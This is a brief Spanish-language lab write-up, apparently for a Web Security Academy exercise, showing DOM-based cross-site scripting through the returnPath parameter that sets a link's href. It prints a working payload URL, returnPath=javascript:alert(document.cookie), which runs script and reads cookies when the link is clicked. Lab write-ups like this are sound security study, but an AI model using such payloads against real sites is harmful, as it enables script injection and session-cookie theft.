 Exploamos la capacidad de poder modificar los valores de la propiedad href de algunos elementos. A dia de hoy no es muy usual 
En el contexto inicial el valor de returnPath era / que nos redirigia a la home page
```
https://0a4d00e30403c1bd81ec07ad002800a5.web-security-academy.net/feedback?returnPath=/
```

Una vez modificado pues al darle al boton a link que esta asociado a esta acción pues nos ejecutaría nuestro código
```
https://0a4d00e30403c1bd81ec07ad002800a5.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```